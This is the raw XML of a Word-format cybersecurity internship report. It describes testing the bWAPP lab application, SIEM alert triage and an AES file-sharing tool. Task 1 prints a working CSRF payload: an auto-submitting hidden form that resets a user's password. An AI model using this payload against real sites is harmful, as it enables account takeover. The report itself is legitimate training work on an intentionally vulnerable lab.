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Cybersecurity Internship Report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Internship Organization: Redynox</w:t>
        <w:br/>
        <w:t>Intern Name: Benjamin John Igwuomoh</w:t>
        <w:br/>
        <w:t>Email: benj421239@gmail.com</w:t>
        <w:br/>
        <w:t>LinkedIn: https://www.linkedin.com/in/igwuomoh-ben-2b3761374</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>Submission Date: July 20, 2025</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Task 1: Web Application Security Testing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>In this task, I was assigned to identify and exploit common vulnerabilities in a web application (bWAPP) hosted in a VirtualBox environment. I tested for Cross-Site Scripting (XSS), SQL Injection, and Cross-Site Request Forgery (CSRF). I used tools like Burp Suite and ZAP for proxy analysis and payload testing.</w:t>
        <w:br/>
        <w:br/>
        <w:t>For CSRF, I created a working proof-of-concept HTML payload to reset a user's password automatically when the victim visited the page. This demonstrated a valid security flaw in the password change functionality.</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>Sample CSRF Payload Used:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>&lt;html&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;body&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;form action="http://&lt;your_bWAPP_IP&gt;/bWAPP/csrf_1.php" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">      &lt;input type="hidden" name="password_new" value="hacked123" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">      &lt;input type="hidden" name="password_conf" value="hacked123" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">      &lt;input type="submit" value="Submit form" /&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;/form&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/body&gt;</w:t>
        <w:br/>
        <w:t>&lt;/html&gt;</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Task 2: SIEM Alert Monitoring and Incident Response</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>In this task, I analyzed simulated alerts using a SIEM platform. I practiced classifying security alerts into categories such as Reconnaissance, Credential Access, and Exfiltration. I generated a timeline of events, assessed the impact, and drafted incident response emails.</w:t>
        <w:br/>
        <w:br/>
        <w:t>Key skills demonstrated: event correlation, log analysis, alert prioritization, and report documentation for stakeholders.</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Task 3: Secure File Sharing System with Encryption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>For this task, I designed a basic encrypted file-sharing application using Python. The system supports AES encryption to ensure confidentiality and integrity of shared files between users. I documented the source code, tested the encryption/decryption routines, and ensured files could not be accessed without the correct keys.</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Reflection and Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:t>This internship has expanded my hands-on understanding of real-world cybersecurity tools and techniques. Through vulnerability testing, alert handling, and secure system design, I have developed critical analytical and technical skills.</w:t>
        <w:br/>
        <w:br/>
        <w:t>I am confident that the knowledge gained will aid in my continued growth as a cybersecurity professional.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